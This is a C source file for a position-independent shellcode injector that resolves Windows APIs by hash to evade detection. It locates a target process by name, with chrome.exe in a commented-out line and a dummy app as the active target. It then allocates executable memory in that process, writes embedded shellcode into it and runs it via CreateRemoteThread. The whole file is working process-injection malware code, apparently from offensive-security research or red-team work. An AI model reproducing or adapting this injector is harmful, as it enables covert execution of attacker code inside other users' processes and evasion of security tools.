#include "debug.h"
#include "peb_lookup.h"

#include <intrin.h>

typedef struct tagPROCESSENTRY32 {
    DWORD     dwSize;
    DWORD     cntUsage;
    DWORD     th32ProcessID;
    ULONG_PTR th32DefaultHeapID;
    DWORD     th32ModuleID;
    DWORD     cntThreads;
    DWORD     th32ParentProcessID;
    LONG      pcPriClassBase;
    DWORD     dwFlags;
    CHAR      szExeFile[MAX_PATH];
} PROCESSENTRY32;

typedef HANDLE(WINAPI* _CreateToolhelp32Snapshot)(
    DWORD dwFlags,
    DWORD th32ProcessID);

typedef BOOL (WINAPI* _Process32First)(
    HANDLE hSnapshot,
    PROCESSENTRY32* lppe);

typedef BOOL (WINAPI* _Process32Next)(
    HANDLE hSnapshot,
    PROCESSENTRY32* lppe);

typedef HANDLE (WINAPI* _OpenProcess)(
    DWORD dwDesiredAccess,
    BOOL bInheritHandle,
    DWORD dwProcessId);

typedef LPVOID (WINAPI* _VirtualAllocEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect);

typedef BOOL (WINAPI* _WriteProcessMemory)(
    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T* lpNumberOfBytesWritten);

typedef HANDLE (WINAPI* _CreateRemoteThread)(
    HANDLE hProcess,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId);

typedef BOOL (WINAPI* _CloseHandle)(
    HANDLE hObject);

// We assume this data structure for the concatenated shellcode
typedef struct {
    DWORD length;
    unsigned char* shellcode;
} ShellcodeData;

__declspec(noinline) void* CurrentAddress() {
	return _ReturnAddress();
}

int main() {
    int returnValue = 0;

	// Get the concatenated shellcode pointer by adding an offset to the current instruction pointer value
	const void* currentAddressPointer = CurrentAddress();

	// Concatenated data offset should be: sizeof(this entire shellcode) - 0xE
	// See reflective_loader.c comment
#ifdef DEBUG_PRINT
	const unsigned int kDataOffset = 0xff2;
#else
	const unsigned int kDataOffset = 0xbf2;
#endif

	const ShellcodeData* shellcodeDataPtr
		= (DWORD_PTR)currentAddressPointer + kDataOffset;

    void* kernel32Module = GetModuleByHash(0x7040ee75);
    if (!kernel32Module) {
        return 1;
    }

    DebugInitialise(kernel32Module);

    DefineImportedFuncPtrByHash(kernel32Module, CreateToolhelp32Snapshot, 0x66851295);
    DefineImportedFuncPtrByHash(kernel32Module, Process32First, 0x9278b871);
    DefineImportedFuncPtrByHash(kernel32Module, Process32Next, 0x90177f28);
    DefineImportedFuncPtrByHash(kernel32Module, OpenProcess, 0x7136fdd6);
    DefineImportedFuncPtrByHash(kernel32Module, VirtualAllocEx, 0xf36e5ab4);
    DefineImportedFuncPtrByHash(kernel32Module, WriteProcessMemory, 0x6f22e8c8);
    DefineImportedFuncPtrByHash(kernel32Module, CreateRemoteThread, 0xaa30775d);
    DefineImportedFuncPtrByHash(kernel32Module, CloseHandle, 0x3870ca07);

    DWORD processId = 0;
    HANDLE hSnapshot = CreateToolhelp32SnapshotFuncPtr(0x00000002, 0); // TH32CS_SNAPPROCESS
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 1;
    }

    // Note these are lowercase hashes which will give a case insensitive comparison
    //DWORD targetProcessHash = 0xb3a3f9b3; // chrome.exe
    DWORD targetProcessHash = 0xa031adf2; // DummyWinsock2App.exe

    PROCESSENTRY32 processEntry = { 0 };
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32FirstFuncPtr(hSnapshot, &processEntry)) {
        do {
            // TODO do it with hashes
            //DWORD currentHash = HashBufferLowercase(processEntry.szExeFile, 
            if (AreStringsEqualCaseInsensitive("DummyWinsock2App.exe", processEntry.szExeFile)) {
                processId = processEntry.th32ProcessID;
                break;
            }
        } while (Process32NextFuncPtr(hSnapshot, &processEntry));
    }

    CloseHandleFuncPtr(hSnapshot);

    if (processId == 0) {
        return 2;
    }

    const auto processHandle = OpenProcessFuncPtr(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!processHandle) {
        return 3;
    }

    // RWX allocation
    const auto remoteBuffer = VirtualAllocExFuncPtr(
        processHandle,
        NULL,
        shellcodeDataPtr->length,
        (MEM_RESERVE | MEM_COMMIT),
        PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer) {
        returnValue = 4;
        goto Cleanup;
    }

    const auto success = WriteProcessMemoryFuncPtr(
        processHandle,
        remoteBuffer,
        shellcodeDataPtr->shellcode,
        shellcodeDataPtr->length,
        NULL);
    if (!success) {
        returnValue = 5;
        goto Cleanup;
    }

    const auto remoteThread = CreateRemoteThreadFuncPtr(
        processHandle,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remoteBuffer,
        NULL,
        0, NULL);
    if (!remoteThread) {
        returnValue = 6;
        goto Cleanup;
    }

    CloseHandleFuncPtr(remoteThread);

Cleanup:
    CloseHandleFuncPtr(processHandle);

    return returnValue;
}